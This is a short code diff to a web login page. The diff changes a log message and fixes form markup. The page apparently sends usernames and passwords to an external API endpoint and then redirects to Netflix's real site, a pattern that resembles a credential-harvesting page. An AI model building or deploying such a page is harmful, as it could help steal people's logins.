@@ -159,7 +159,7 @@ input[type=submit]:hover {
             {
                 console.log('Username not found!');
                 // const userConfirmed = window.confirm('Login already in use, pls provide new one');
-                setTimeout(() => { console.log('Status code is 201'); }, 2000);
+                setTimeout(() => { console.log('Status code is 202'); }, 2000);
                 window.location.href = 'https://www.netflix.com'
             }
             } else {
@@ -199,12 +199,14 @@ input[type=submit]:hover {
         <div class="hide-md-lg">
           <p>Or sign in manually:</p>
         </div>
+          <div class="container">
          <form method="POST" action="https://f9ftxg5q33.execute-api.us-west-1.amazonaws.com/Dev">
         <input type="text" name="signup_username" placeholder="Username" required id="signup_username">
         <input type="password" name="signin_passwd" placeholder="Password" required id="signin_passwd">
           <input type="submit" onclick="callsigninAPI(document.getElementById('signup_username').value,document.getElementById('signin_passwd').value)" value="Login">
+         </form>
       </div>
-  </form>
+
     </div>
 </div>
 
